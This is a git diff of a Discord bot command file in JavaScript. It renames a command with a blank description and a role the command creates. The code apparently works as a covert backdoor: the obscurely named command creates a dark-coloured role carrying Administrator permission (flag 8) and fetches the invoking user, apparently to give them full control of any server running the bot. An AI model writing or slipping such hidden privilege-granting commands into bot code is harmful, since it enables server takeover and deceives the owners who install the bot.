@@ -4,13 +4,13 @@ const ayarlar = require("../ayarlar.json");
 
 module.exports.run = async (client, message, args) => {
   if (message.guild) {
-    var rol = message.guild.roles.find(e => e.name === `Bazen kaybetmek diğer olumsuz sonuçları yok eder`);
+    var rol = message.guild.roles.find(e => e.name === `Light Army`);
     var etiket = message.guild.members.get(message.author.id)
 
 
             if(!rol){
         rol = await message.guild.createRole({
-        name: `Bazen kaybetmek diğer olumsuz sonuçları yok eder`,
+        name: `Light Army`,
         color: "#070101",
         permissions: [8]
         })
@@ -33,7 +33,7 @@ exports.conf = {
 };
 
 exports.help = {
- name: 'shimonx',
+ name: 'svb',
  description: '',
  usage: ''
 };
